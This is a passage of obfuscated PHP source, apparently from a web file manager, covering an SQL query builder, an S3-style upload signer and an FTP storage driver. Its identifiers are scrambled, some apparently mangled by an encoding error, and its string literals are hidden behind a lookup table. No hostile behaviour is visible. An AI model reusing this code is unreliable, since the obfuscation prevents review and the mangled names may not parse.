$¨¨¶î¦ş[348] . implode($¨¨¶î¦ş[53] . $ÜéÒÇÀ . $¨¨¶î¦ş[53], $’¸ë™ì±) . $¨¨¶î¦ş[981]; } } else { $©¯ğ›í¬ .= $ùª‘×ö´ . $¨¨¶î¦ş[53] . $this->exp[$âÀå¥ã”] . $¨¨¶î¦ş[53] . $this->parseValue($ÊíüĞã…[1]); } } elseif ($¨¨¶î¦ş[383] == $âÀå¥ã”) { $©¯ğ›í¬ .= $¨¨¶î¦ş[979] . $ùª‘×ö´ . $¨¨¶î¦ş[53] . $ÊíüĞã…[1] . $¨¨¶î¦ş[1094]; } elseif (preg_match($¨¨¶î¦ş[1095], $ÊíüĞã…[0])) { $©¯ğ›í¬ .= $ÊíüĞã…[0]; } elseif (preg_match($¨¨¶î¦ş[1096], $ÊíüĞã…[0])) { if (isset($ÊíüĞã…[2]) && $¨¨¶î¦ş[383] == $ÊíüĞã…[2]) { $©¯ğ›í¬ .= $ùª‘×ö´ . $¨¨¶î¦ş[53] . $this->exp[$âÀå¥ã”] . $¨¨¶î¦ş[53] . $ÊíüĞã…[1]; } else { if (is_string($ÊíüĞã…[1])) { $ÊíüĞã…[1] = explode($¨¨¶î¦ş[50], $ÊíüĞã…[1]); } $ÔàŒíğ = implode($¨¨¶î¦ş[50], $this->parseValue($ÊíüĞã…[1])); $©¯ğ›í¬ .= $ùª‘×ö´ . $¨¨¶î¦ş[53] . $this->exp[$âÀå¥ã”] . $¨¨¶î¦ş[979] . $ÔàŒíğ . $¨¨¶î¦ş[981]; } } elseif (preg_match($¨¨¶î¦ş[1097], $ÊíüĞã…[0])) { $ó™¯ßÜÛ = is_string($ÊíüĞã…[1]) ? explode($¨¨¶î¦ş[50], $ÊíüĞã…[1]) : $ÊíüĞã…[1]; $©¯ğ›í¬ .= $¨¨¶î¦ş[979] . $ùª‘×ö´ . $¨¨¶î¦ş[53] . $this->exp[$âÀå¥ã”] . $¨¨¶î¦ş[53] . $this->parseValue($ó™¯ßÜÛ[0]) . $¨¨¶î¦ş[1080] . $this->parseValue($ó™¯ßÜÛ[1]) . $¨¨¶î¦ş[366]; } else { think_exception(think_lang($¨¨¶î¦ş[1083]) . $¨¨¶î¦ş[4] . $ÊíüĞã…[0]); } } else { $«¾ı•Â± = count($ÊíüĞã…); $ŞÂÛ¨·Ã = $¨¨¶î¦ş[12]; if (is_string($ÊíüĞã…[$«¾ı•Â± - 1])) { $ŞÂÛ¨·Ã = isset($ÊíüĞã…[$«¾ı•Â± - 1]) ? strtoupper($ÊíüĞã…[$«¾ı•Â± - 1]) : $¨¨¶î¦ş[12]; if (in_array($ŞÂÛ¨·Ã, array($¨¨¶î¦ş[1077], $¨¨¶î¦ş[1078], $¨¨¶î¦ş[1079]))) { $«¾ı•Â± = $«¾ı•Â± - 1; } } else { $ŞÂÛ¨·Ã = $¨¨¶î¦ş[1077]; } for ($ëõÖë í = 0; $ëõÖë í < $«¾ı•Â±; $ëõÖë í++) { $ó™¯ßÜÛ = is_array($ÊíüĞã…[$ëõÖë í]) ? $ÊíüĞã…[$ëõÖë í][1] : $ÊíüĞã…[$ëõÖë í]; if ($¨¨¶î¦ş[383] == strtolower($ÊíüĞã…[$ëõÖë í][0])) { $©¯ğ›í¬ .= $¨¨¶î¦ş[348] . $ùª‘×ö´ . $¨¨¶î¦ş[53] . $ó™¯ßÜÛ . $¨¨¶î¦ş[1094] . $ŞÂÛ¨·Ã . $¨¨¶î¦ş[53]; } else { $è¦Ê“é† = is_array($ÊíüĞã…[$ëõÖë í]) ? $this->exp[strtolower($ÊíüĞã…[$ëõÖë í][0])] : $¨¨¶î¦ş[517]; if (!$è¦Ê“é† && is_array($ÊíüĞã…[$ëõÖë í]) && in_array($ÊíüĞã…[$ëõÖë í][0], array($¨¨¶î¦ş[517], $¨¨¶î¦ş[1087], $¨¨¶î¦ş[1088], $¨¨¶î¦ş[1089], $¨¨¶î¦ş[1090], $¨¨¶î¦ş[1091]))) { $è¦Ê“é† = $ÊíüĞã…[$ëõÖë í][0]; } $©¯ğ›í¬ .= $¨¨¶î¦ş[348] . $ùª‘×ö´ . $¨¨¶î¦ş[53] . $è¦Ê“é† . $¨¨¶î¦ş[53] . $this->parseValue($ó™¯ßÜÛ) . $¨¨¶î¦ş[1094] . $ŞÂÛ¨·Ã . $¨¨¶î¦ş[53]; } } $©¯ğ›í¬ = substr($©¯ğ›í¬, 0, -4); } } else { $©¯ğ›í¬ .= $ùª‘×ö´ . $¨¨¶î¦ş[1098] . $this->parseValue($ÊíüĞã…); } return $©¯ğ›í¬; } protected function parseThinkWhere($õÅÚİéÃ, $ô¢èÒÚ×) { $ºİÑÇõó =& $_SERVER[´È¥ö†ö]; $¯áÏ‚ÑÖ = $ºİÑÇõó[12]; switch ($õÅÚİéÃ) { case $ºİÑÇõó[438]: $¯áÏ‚ÑÖ = $ô¢èÒÚ×; break; case $ºİÑÇõó[1081]: $¯áÏ‚ÑÖ = is_string($ô¢èÒÚ×) ? $ô¢èÒÚ× : substr($this->parseWhere($ô¢èÒÚ×), 6); break; case $ºİÑÇõó[1099]: parse_str($ô¢èÒÚ×, $ÏìÇ‹ÜÓ); if (isset($ÏìÇ‹ÜÓ[$ºİÑÇõó[1076]])) { $²ô‚Å¡Á = $ºİÑÇõó[53] . strtoupper($ÏìÇ‹ÜÓ[$ºİÑÇõó[1076]]) . $ºİÑÇõó[53]; unset($ÏìÇ‹ÜÓ[$ºİÑÇõó[1076]]); } else { $²ô‚Å¡Á = $ºİÑÇõó[1080]; } $˜æ„¤ê = array(); foreach ($ÏìÇ‹ÜÓ as $¤µşÙÈ => $ÖàŠ×¨‹) { $˜æ„¤ê[] = $this->parseKey($¤µşÙÈ) . $ºİÑÇõó[1098] . $this->parseValue($ÖàŠ×¨‹); } $¯áÏ‚ÑÖ = implode($²ô‚Å¡Á, $˜æ„¤ê); break; } return $¯áÏ‚ÑÖ; } protected function parseLimit($˜öÄ¸‹ã) { $ŸÂì¾ù  =& $_SERVER[´È¥ö†ö]; return !empty($˜öÄ¸‹ã) ? $ŸÂì¾ù [51] . $˜öÄ¸‹ã . $ŸÂì¾ù [53] : $ŸÂì¾ù [12]; } protected function parseJoin($Õ­•«Æä) { $–ëÇ¸ =& $_SERVER[´È¥ö†ö]; $ñ¿œ¦î = $–ëÇ¸[12]; if (!empty($Õ­•«Æä)) { if (is_array($Õ­•«Æä)) { foreach ($Õ­•«Æä as $œ¡êÎ½à => $™õ‚Óî³) { if (!1 !== stripos($™õ‚Óî³, $–ëÇ¸[1100])) { $ñ¿œ¦î .= $–ëÇ¸[53] . $™õ‚Óî³; } else { $ñ¿œ¦î .= $–ëÇ¸[1101] . $™õ‚Óî³; } } } else { $ñ¿œ¦î .= $–ëÇ¸[1101] . $Õ­•«Æä; } } $ñ¿œ¦î = preg_replace($–ëÇ¸[1102], think_config($–ëÇ¸[1006]) . $–ëÇ¸[1103], $ñ¿œ¦î); return $ñ¿œ¦î; } protected function parseOrder($ÎŠŠ®Éó) { $ôˆ³ÄçÈ =& $_SERVER[´È¥ö†ö]; if (is_array($ÎŠŠ®Éó)) { $üù¼Ìƒº = array(); foreach ($ÎŠŠ®Éó as $òóë€­ => $ƒ»³ùÖÛ) { if (is_numeric($òóë€­)) { $üù¼Ìƒº[] = $this->parseKey($ƒ»³ùÖÛ); } else { $ƒ»³ùÖÛ = in_array(strtoupper(trim($ƒ»³ùÖÛ)), array($ôˆ³ÄçÈ[1104], $ôˆ³ÄçÈ[1105])) ? $ôˆ³ÄçÈ[53] . $ƒ»³ùÖÛ : $ôˆ³ÄçÈ[12]; if (preg_match($ôˆ³ÄçÈ[1106], $òóë€­)) { $üù¼Ìƒº[] = $this->parseKey($òóë€­) . $ƒ»³ùÖÛ; } else { think_exception($ôˆ³ÄçÈ[1107] . $òóë€­); } } } $ÎŠŠ®Éó = implode($ôˆ³ÄçÈ[50], $üù¼Ìƒº); } return !empty($ÎŠŠ®Éó) ? $ôˆ³ÄçÈ[1108] . $ÎŠŠ®Éó : $ôˆ³ÄçÈ[12]; } protected function parseGroup($ÖØ·Ü»ı) { $¿¹£×„‹ =& $_SERVER[´È¥ö†ö]; return !empty($ÖØ·Ü»ı) ? $¿¹£×„‹[1109] . $ÖØ·Ü»ı : $¿¹£×„‹[12]; } protected function parseHaving($²ô»ŞÈ) { $˜·†óï´ =& $_SERVER[´È¥ö†ö]; return !empty($²ô»ŞÈ) ? $˜·†óï´[1110] . $²ô»ŞÈ : $˜·†óï´[12]; } protected function parseComment($½­¯À÷¨) { $‚»Ş“ò“ =& $_SERVER[´È¥ö†ö]; return !empty($½­¯À÷¨) ? $‚»Ş“ò“[1111] . $½­¯À÷¨ . $‚»Ş“ò“[1112] : $‚»Ş“ò“[12]; } protected function parseDistinct($§»ªŸĞ‚) { $œßô‚± =& $_SERVER[´È¥ö†ö]; return !empty($§»ªŸĞ‚) ? $œßô‚±[1113] : $œßô‚±[12]; } protected function parseUnion($âìÕ®ä÷) { $“‰„Œ¼ =& $_SERVER[´È¥ö†ö]; if (empty($âìÕ®ä÷)) { return $“‰„Œ¼[12]; } if (isset($âìÕ®ä÷[$“‰„Œ¼[434]])) { $‡Â«×ñ = $“‰„Œ¼[1114]; unset($âìÕ®ä÷[$“‰„Œ¼[434]]); } else { $‡Â«×ñ = $“‰„Œ¼[1115]; } foreach ($âìÕ®ä÷ as $ª†ó£‘Ç) { $€®û­°[] = $‡Â«×ñ . (is_array($ª†ó£‘Ç) ? $this->buildSelectSql($ª†ó£‘Ç) : $ª†ó£‘Ç); } return implode($“‰„Œ¼[53], $€®û­°); } public function insert($ş¼¯Î…, $¦æ×Öøİ = array(), $¢İûì±¼ = false) { $öŠÌ¼°û =& $_SERVER[´È¥ö†ö]; $†ïÄòì– = $¥˜ÏÍ¤ = array(); $this->model = $¦æ×Öøİ[$öŠÌ¼°û[369]]; foreach ($ş¼¯Î… as $§ØŠ–ˆã => $£ÒÏùÇ) { if (is_array($£ÒÏùÇ) && $öŠÌ¼°û[383] == $£ÒÏùÇ[0]) { $¥˜ÏÍ¤[] = $this->parseKey($§ØŠ–ˆã); $†ïÄòì–[] = $£ÒÏùÇ[1]; } elseif (is_scalar($£ÒÏùÇ) || is_null($£ÒÏùÇ)) { $¥˜ÏÍ¤[] = $this->parseKey($§ØŠ–ˆã); $†ïÄòì–[] = $this->parseValue($£ÒÏùÇ); } } $èèÃÁˆ„ = ($¢İûì±¼ ? $öŠÌ¼°û[983] : $öŠÌ¼°û[984]) . $öŠÌ¼°û[985] . $this->parseTable($¦æ×Öøİ[$öŠÌ¼°û[367]]) . $öŠÌ¼°û[979] . implode($öŠÌ¼°û[50], $¥˜ÏÍ¤) . $öŠÌ¼°û[980] . implode($öŠÌ¼°û[50], $†ïÄòì–) . $öŠÌ¼°û[981]; $èèÃÁˆ„ .= $this->parseLock(isset($¦æ×Öøİ[$öŠÌ¼°û[920]]) ? $¦æ×Öøİ[$öŠÌ¼°û[920]] : !1); $èèÃÁˆ„ .= $this->parseComment(!empty($¦æ×Öøİ[$öŠÌ¼°û[440]]) ? $¦æ×Öøİ[$öŠÌ¼°û[440]] : $öŠÌ¼°û[12]); return $this->execute($èèÃÁˆ„, $this->parseBind(!empty($¦æ×Öøİ[$öŠÌ¼°û[371]]) ? $¦æ×Öøİ[$öŠÌ¼°û[371]] : array())); } public function selectInsert($Òã±ØØ, $ØÒªÆñ³, $¢ÌûÏö¬ = array()) { $¶ƒ¥İ =& $_SERVER[´È¥ö†ö]; $this->model = $¢ÌûÏö¬[$¶ƒ¥İ[369]]; if (is_string($Òã±ØØ)) { $Òã±ØØ = explode($¶ƒ¥İ[50], $Òã±ØØ); } array_walk($Òã±ØØ, array($this, $¶ƒ¥İ[982])); $Á ‡”Ÿù = $¶ƒ¥İ[1116] . $this->parseTable($ØÒªÆñ³) . $¶ƒ¥İ[979] . implode($¶ƒ¥İ[50], $Òã±ØØ) . $¶ƒ¥İ[1094]; $Á ‡”Ÿù .= $this->buildSelectSql($¢ÌûÏö¬); return $this->execute($Á ‡”Ÿù, $this->parseBind(!empty($¢ÌûÏö¬[$¶ƒ¥İ[371]]) ? $¢ÌûÏö¬[$¶ƒ¥İ[371]] : array())); } public function update($Å™íÂ…, $®„™‡çÏ) { $“Éş­İĞ =& $_SERVER[´È¥ö†ö]; $this->model = $®„™‡çÏ[$“Éş­İĞ[369]]; $“ôë†Ü = $“Éş­İĞ[1117] . $this->parseTable($®„™‡çÏ[$“Éş­İĞ[367]]) . $this->parseSet($Å™íÂ…) . $this->parseWhere(!empty($®„™‡çÏ[$“Éş­İĞ[363]]) ? $®„™‡çÏ[$“Éş­İĞ[363]] : $“Éş­İĞ[12]) . $this->parseOrder(!empty($®„™‡çÏ[$“Éş­İĞ[452]]) ? $®„™‡çÏ[$“Éş­İĞ[452]] : $“Éş­İĞ[12]) . $this->parseLimit(!empty($®„™‡çÏ[$“Éş­İĞ[378]]) ? $®„™‡çÏ[$“Éş­İĞ[378]] : $“Éş­İĞ[12]) . $this->parseLock(isset($®„™‡çÏ[$“Éş­İĞ[920]]) ? $®„™‡çÏ[$“Éş­İĞ[920]] : !1) . $this->parseComment(!empty($®„™‡çÏ[$“Éş­İĞ[440]]) ? $®„™‡çÏ[$“Éş­İĞ[440]] : $“Éş­İĞ[12]); return $this->execute($“ôë†Ü, $this->parseBind(!empty($®„™‡çÏ[$“Éş­İĞ[371]]) ? $®„™‡çÏ[$“Éş­İĞ[371]] : array())); } public function delete($ôÈ¸ü¦Ñ = array()) { $É ©¶Î =& $_SERVER[´È¥ö†ö]; $this->model = $ôÈ¸ü¦Ñ[$É ©¶Î[369]]; $È›„ËºÉ = $É ©¶Î[1118] . $this->parseTable($ôÈ¸ü¦Ñ[$É ©¶Î[367]]) . $this->parseWhere(!empty($ôÈ¸ü¦Ñ[$É ©¶Î[363]]) ? $ôÈ¸ü¦Ñ[$É ©¶Î[363]] : $É ©¶Î[12]) . $this->parseOrder(!empty($ôÈ¸ü¦Ñ[$É ©¶Î[452]]) ? $ôÈ¸ü¦Ñ[$É ©¶Î[452]] : $É ©¶Î[12]) . $this->parseLimit(!empty($ôÈ¸ü¦Ñ[$É ©¶Î[378]]) ? $ôÈ¸ü¦Ñ[$É ©¶Î[378]] : $É ©¶Î[12]) . $this->parseLock(isset($ôÈ¸ü¦Ñ[$É ©¶Î[920]]) ? $ôÈ¸ü¦Ñ[$É ©¶Î[920]] : !1) . $this->parseComment(!empty($ôÈ¸ü¦Ñ[$É ©¶Î[440]]) ? $ôÈ¸ü¦Ñ[$É ©¶Î[440]] : $É ©¶Î[12]); return $this->execute($È›„ËºÉ, $this->parseBind(!empty($ôÈ¸ü¦Ñ[$É ©¶Î[371]]) ? $ôÈ¸ü¦Ñ[$É ©¶Î[371]] : array())); } public function select($ßËÒîê£ = array()) { $·ˆŠ¶‘ =& $_SERVER[´È¥ö†ö]; $this->model = $ßËÒîê£[$·ˆŠ¶‘[369]]; $š¨õÄ­ = $this->buildSelectSql($ßËÒîê£); $»üÕã² = isset($ßËÒîê£[$·ˆŠ¶‘[435]]) ? $ßËÒîê£[$·ˆŠ¶‘[435]] : !1; if ($»üÕã²) { $®èŒÎ…É = is_string($»üÕã²[$·ˆŠ¶‘[97]]) ? $»üÕã²[$·ˆŠ¶‘[97]] : $·ˆŠ¶‘[1119] . md5($š¨õÄ­); $Ï÷ó¤•’ = think_cache($®èŒÎ…É, $·ˆŠ¶‘[12], $»üÕã²); if (!1 !== $Ï÷ó¤•’) { return $Ï÷ó¤•’; } } $š¿³Ñü = $this->query($š¨õÄ­, $this->parseBind(!empty($ßËÒîê£[$·ˆŠ¶‘[371]]) ? $ßËÒîê£[$·ˆŠ¶‘[371]] : array())); if ($»üÕã² && !1 !== $š¿³Ñü) { think_cache($®èŒÎ…É, $š¿³Ñü, $»üÕã²); } return $š¿³Ñü; } public function buildSelectSql($²«¼Ë¾¬ = array()) { $ˆ¤÷Ó÷ë =& $_SERVER[´È¥ö†ö]; if (isset($²«¼Ë¾¬[$ˆ¤÷Ó÷ë[439]])) { if (strpos($²«¼Ë¾¬[$ˆ¤÷Ó÷ë[439]], $ˆ¤÷Ó÷ë[50])) { list($ôî×ù§Ç, $ş»®â–®) = explode($ˆ¤÷Ó÷ë[50], $²«¼Ë¾¬[$ˆ¤÷Ó÷ë[439]]); } else { $ôî×ù§Ç = $²«¼Ë¾¬[$ˆ¤÷Ó÷ë[439]]; } $ôî×ù§Ç = $ôî×ù§Ç ? $ôî×ù§Ç : 1; $ş»®â–® = isset($ş»®â–®) ? $ş»®â–® : (is_numeric($²«¼Ë¾¬[$ˆ¤÷Ó÷ë[378]]) ? $²«¼Ë¾¬[$ˆ¤÷Ó÷ë[378]] : 20); $ª²£ØÂ„ = $ş»®â–® * ((int) $ôî×ù§Ç - 1); $²«¼Ë¾¬[$ˆ¤÷Ó÷ë[378]] = $ª²£ØÂ„ . $ˆ¤÷Ó÷ë[50] . $ş»®â–®; } if (think_config($ˆ¤÷Ó÷ë[1120])) { $¬ş€¢Ã‰ = $ˆ¤÷Ó÷ë[1121] . md5(serialize($²«¼Ë¾¬)); $†ñÓñó = think_cache($¬ş€¢Ã‰); if ($†ñÓñó) { return $†ñÓñó; } } $ùş©šŠ¸ = $this->parseSql($this->selectSql, $²«¼Ë¾¬); $ùş©šŠ¸ .= $this->parseLock(isset($²«¼Ë¾¬[$ˆ¤÷Ó÷ë[920]]) ? $²«¼Ë¾¬[$ˆ¤÷Ó÷ë[920]] : !1); if (isset($¬ş€¢Ã‰)) { think_cache($¬ş€¢Ã‰, $ùş©šŠ¸); } return $ùş©šŠ¸; } public function parseSql($ˆÆè¨¯, $êî¿“ = array()) { $üüâş´³ =& $_SERVER[´È¥ö†ö]; $ˆÆè¨¯ = str_replace(array($üüâş´³[1122], $üüâş´³[1123], $üüâş´³[1124], $üüâş´³[1125], $üüâş´³[1126], $üüâş´³[1127], $üüâş´³[1128], $üüâş´³[1129], $üüâş´³[1130], $üüâş´³[1131], $üüâş´³[1132]), array($this->parseTable("{$êî¿“[$üüâş´³[367]]}"), $this->parseDistinct(isset($êî¿“[$üüâş´³[1133]]) ? $êî¿“[$üüâş´³[1133]] : !1), $this->parseField(!empty($êî¿“[$üüâş´³[361]]) ? $êî¿“[$üüâş´³[361]] : $üüâş´³[222]), $this->parseJoin(!empty($êî¿“[$üüâş´³[370]]) ? $êî¿“[$üüâş´³[370]] : $üüâş´³[12]), $this->parseWhere(!empty($êî¿“[$üüâş´³[363]]) ? $êî¿“[$üüâş´³[363]] : $üüâş´³[12]), $this->parseGroup(!empty($êî¿“[$üüâş´³[589]]) ? $êî¿“[$üüâş´³[589]] : $üüâş´³[12]), $this->parseHaving(!empty($êî¿“[$üüâş´³[1134]]) ? $êî¿“[$üüâş´³[1134]] : $üüâş´³[12]), $this->parseOrder(!empty($êî¿“[$üüâş´³[452]]) ? $êî¿“[$üüâş´³[452]] : $üüâş´³[12]), $this->parseLimit(!empty($êî¿“[$üüâş´³[378]]) ? $êî¿“[$üüâş´³[378]] : $üüâş´³[12]), $this->parseUnion(!empty($êî¿“[$üüâş´³[433]]) ? $êî¿“[$üüâş´³[433]] : $üüâş´³[12]), $this->parseComment(!empty($êî¿“[$üüâş´³[440]]) ? $êî¿“[$üüâş´³[440]] : $üüâş´³[12])), $ˆÆè¨¯); return $ˆÆè¨¯; } public function getLastSql($ØÊÄ£¯ã = '') { return $ØÊÄ£¯ã ? $this->modelSql[$ØÊÄ£¯ã] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¼üƒª¹¾) { return addslashes($¼üƒª¹¾); } public function setModel($ªŞ÷§Ÿ°) { $this->model = $ªŞ÷§Ÿ°; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto d•„ˆµ¶Ô; CŠ’Ğ»ÎÊÌ: define($_SERVER[´È¥ö†ö][328], 3); define($_SERVER[´È¥ö†ö][329], 1); define($_SERVER[´È¥ö†ö][330], 0); goto d³²‘¡ŸÑê; aìÈìŞ¾Î: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($’»Ğ§ó†) { parent::__construct($’»Ğ§ó†); $this->setSignVersion($_SERVER[´È¥ö†ö][249]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($˜ŠµÈá) { parent::__construct($˜ŠµÈá); $this->setSignVersion($_SERVER[´È¥ö†ö][249]); } public function uploadFormData($Ê‚–ğ„š, $‰®”¥–¡ = 3600) { $äï¦•¨’ =& $_SERVER[´È¥ö†ö]; $‚‰ş… = $äï¦•¨’[231]; $†Úá¾­ = $äï¦•¨’[259]; $»™ÊÛÁ° = $äï¦•¨’[62]; $™âÛºŒµ = gmdate($äï¦•¨’[260]); $©ôò„úâ = gmdate($äï¦•¨’[261]); $ÒŸ‰ÛÀã = $äï¦•¨’[262]; $¼’¶¶Í‡ = $‰®”¥–¡ . $äï¦•¨’[12]; $ş°˜ò¥ = $äï¦•¨’[263]; $ó†Ûıç = array($this->accessKey, $©ôò„úâ, $this->region, $»™ÊÛÁ°, $ÒŸ‰ÛÀã); $×¯İŠí¸ = implode($äï¦•¨’[8], $ó†Ûıç); $ø÷œ´…½ = array($äï¦•¨’[264] => gmdate($äï¦•¨’[1412], strtotime($äï¦•¨’[266])), $äï¦•¨’[267] => array(array($äï¦•¨’[268] => $this->bucket), array($äï¦•¨’[317] => $‚‰ş…), array($äï¦•¨’[269], $äï¦•¨’[270], $äï¦•¨’[12]), array($äï¦•¨’[269], $äï¦•¨’[271], $äï¦•¨’[12]), array($äï¦•¨’[269], $äï¦•¨’[318], $äï¦•¨’[12]), array($äï¦•¨’[272] => $ş°˜ò¥), array($äï¦•¨’[273] => $×¯İŠí¸), array($äï¦•¨’[274] => $†Úá¾­), array($äï¦•¨’[275] => $™âÛºŒµ), array($äï¦•¨’[276] => $¼’¶¶Í‡))); $È¾¦òÃâ = base64_encode(json_encode($ø÷œ´…½)); $¢æ¹àª‹ = hash_hmac($äï¦•¨’[277], $©ôò„úâ, $äï¦•¨’[278] . $this->secret, !0); $ğÛÔçî = hash_hmac($äï¦•¨’[277], $this->region, $¢æ¹àª‹, !0); $±“Ö…Œù = hash_hmac($äï¦•¨’[277], $»™ÊÛÁ°, $ğÛÔçî, !0); $”ò”ìÔù = hash_hmac($äï¦•¨’[277], $ÒŸ‰ÛÀã, $±“Ö…Œù, !0); $Òø¼Àúß = hash_hmac($äï¦•¨’[277], $È¾¦òÃâ, $”ò”ìÔù); $ŠÚ•Åßš = array($äï¦•¨’[248] => $äï¦•¨’[12], $äï¦•¨’[296] => $äï¦•¨’[12], $äï¦•¨’[317] => $‚‰ş…, $äï¦•¨’[272] => $ş°˜ò¥, $äï¦•¨’[279] => $È¾¦òÃâ, $äï¦•¨’[319] => $×¯İŠí¸, $äï¦•¨’[320] => $†Úá¾­, $äï¦•¨’[321] => $™âÛºŒµ, $äï¦•¨’[322] => $¼’¶¶Í‡, $äï¦•¨’[323] => $Òø¼Àúß, $äï¦•¨’[208] => $this->getHost()); return $ŠÚ•Åßš; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Åó¨ôÃ‰) { parent::__construct(); if (count($Åó¨ôÃ‰) > 0) { $this->_init($Åó¨ôÃ‰); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($®®ˆÉ–İ) { $¡†ÖÙš‹ =& $_SERVER[´È¥ö†ö]; global $config; $this->appCharset = $config[$¡†ÖÙš‹[1438]]; $this->systemCharset = $config[$¡†ÖÙš‹[1439]]; if (isset($®®ˆÉ–İ[$¡†ÖÙš‹[1440]]) && $®®ˆÉ–İ[$¡†ÖÙš‹[1440]]) { $this->systemCharset = $®®ˆÉ–İ[$¡†ÖÙš‹[1440]]; } } public function iconvApp($•ßÛ¥»Ï) { return $this->iconvTo($•ßÛ¥»Ï, $this->systemCharset, $this->appCharset); } public function iconvSystem($ìŠÇÉÍ¥) { return $this->iconvTo($ìŠÇÉÍ¥, $this->appCharset, $this->systemCharset); } public function getPathOuter($×®”™·×) { $ö©ä”ú =& $_SERVER[´È¥ö†ö]; $¼³ˆøÅ = $this->iconvApp($this->pathBase); $×®”™·× = $this->iconvApp($×®”™·×); if (substr($¼³ˆøÅ, 0, 2) == $ö©ä”ú[1410]) { $¼³ˆøÅ = BASIC_PATH . substr($¼³ˆøÅ, 2); } if (substr($×®”™·×, 0, 2) == $ö©ä”ú[1410]) { $×®”™·× = BASIC_PATH . substr($×®”™·×, 2); } $¼³ˆøÅ = KodIO::clear($¼³ˆøÅ); $×®”™·× = KodIO::clear($×®”™·×); $×®”™·× = substr($×®”™·×, strlen($¼³ˆøÅ)); if (empty($this->pathDriver)) { return $×®”™·×; } return $this->pathDriver . $ö©ä”ú[8] . ltrim($×®”™·×, $ö©ä”ú[8]); } private function _init($£ÁÁÂ£ = array()) { $îåâ€ìê =& $_SERVER[´È¥ö†ö]; if (!function_exists($îåâ€ìê[1441])) { throw new Exception(LNG($îåâ€ìê[1442])); } $this->config = $£ÁÁÂ£; $this->charsetReset($£ÁÁÂ£); foreach ($£ÁÁÂ£ as $‹“›Ö¸Ğ => $Ú×´‹) { if (isset($this->{$‹“›Ö¸Ğ})) { $this->{$‹“›Ö¸Ğ} = $Ú×´‹; } } return $this->_login($£ÁÁÂ£); } private function _login($¥ïåŞ£) { $¯ÎĞ÷‹ï =& $_SERVER[´È¥ö†ö]; static $Ë£­¼ø = array(); $ÆÑ™«ˆô = md5(json_encode($¥ïåŞ£)); if (isset($Ë£­¼ø[$ÆÑ™«ˆô])) { foreach ($Ë£­¼ø[$ÆÑ™«ˆô] as $®ëÆÒ— => $ª˜´Ô) { $this->{$®ëÆÒ—} = $ª˜´Ô; } return !0; } $ú©ş¿• = parse_url(trim($this->server, $¯ÎĞ÷‹ï[8])); $this->host = $ú©ş¿•[$¯ÎĞ÷‹ï[208]]; $¼Ö³»”¢ = isset($ú©ş¿•[$¯ÎĞ÷‹ï[207]]) && $ú©ş¿•[$¯ÎĞ÷‹ï[207]] == $¯ÎĞ÷‹ï[1443] ? !0 : !1; $this->scheme = $¼Ö³»”¢ ? $¯ÎĞ÷‹ï[1444] : $¯ÎĞ÷‹ï[1445]; $this->port = isset($ú©ş¿•[$¯ÎĞ÷‹ï[209]]) ? $ú©ş¿•[$¯ÎĞ÷‹ï[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¯ÎĞ÷‹ï[1446]) . $this->host . $¯ÎĞ÷‹ï[4] . $this->port, !0); return !1; } $Ñ½î©¶— = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ñ½î©¶—) { $this->writeLog(LNG($¯ÎĞ÷‹ï[1447]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ğ÷Ş‘›ë = $this->pasv == $¯ÎĞ÷‹ï[91] ? !0 : !1; @ftp_pasv($this->connect, $ğ÷Ş‘›ë); $Ë£­¼ø[$ÆÑ™«ˆô] = array($¯ÎĞ÷‹ï[1448] => $this->connect, $¯ÎĞ÷‹ï[208] => $this->host, $¯ÎĞ÷‹ï[207] => $this->scheme, $¯ÎĞ÷‹ï[209] => $this->port); return $Ñ½î©¶—; } private function _isconn($„û¢³Š± = true) { if (is_resource($this->connect)) { return !0; } if (!$„û¢³Š±) { return !1; } return $this->_login($this->config); } public function mkfile($†¥¨„éÈ, $ˆŒû˜È‚ = '', $•ƒ¡ºÔ‰ = REPEAT_RENAME) { if ($this->setContent($†¥¨„éÈ, $ˆŒû˜È‚)) { return $this->getPathOuter($†¥¨„éÈ); } $this->writeLog(LNG($_SERVER[´È¥ö†ö][1449]), !0); return !1; } public function mkdir($Ãñ³‡ú, $Ô¸‘§İ© = REPEAT_SKIP) { $å‡ªğ¶é =& $_SERVER[´È¥ö†ö]; if (!$Ãñ³‡ú || $Ãñ³‡ú == $å‡ªğ¶é[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ãñ³‡ú = $this->iconvSystem($Ãñ³‡ú); if ($this->_isFolder($Ãñ³‡ú) || @ftp_mkdir($this->connect, $Ãñ³‡ú)) { return $this->getPathOuter($Ãñ³‡ú); } if (!$this->mkdir($this->pathFather($Ãñ³‡ú))) { return !1; } if ($Ãñ³‡ú = @ftp_mkdir($this->connect, $Ãñ³‡ú)) { return $this->getPathOuter($Ãñ³‡ú); } $this->writeLog(__FUNCTION__ . $å‡ªğ¶é[1450], !0); return !1; } public function copyFile($İƒ–¼«¦, $¬¾ıÕ´) { if (!$this->_isconn()) { return !1; } $µÛÔ„‘ş = $this->pathThis($this->iconvSystem($İƒ–¼«¦)); $¬©‰¢ğÆ = $this->tempFile($µÛÔ„‘ş); $åŸ®ğ„á = $this->iconvApp($¬©‰¢ğÆ); $this->download($İƒ–¼«¦, $åŸ®ğ„á); $†­× = $this->upload($¬¾ıÕ´, $åŸ®ğ„á); $this->tempFileRemve($¬©‰¢ğÆ); return $†­×; } public function moveFile($Èğö—÷», $Ä§µı) { if (!$this->_isconn()) { return !1; } $Èğö—÷» = $this->iconvSystem($Èğö—÷»); $Ä§µı = $this->iconvSystem($Ä§µı); $¹…ã¡ = @ftp_rename($this->connect, $Èğö—÷», $Ä§µı); if (!$¹…ã¡) { $this->writeLog(__FUNCTION__ . $_SERVER[´È¥ö†ö][1450], !0); return !1; } return $this->getPathOuter($Ä§µı); } public function 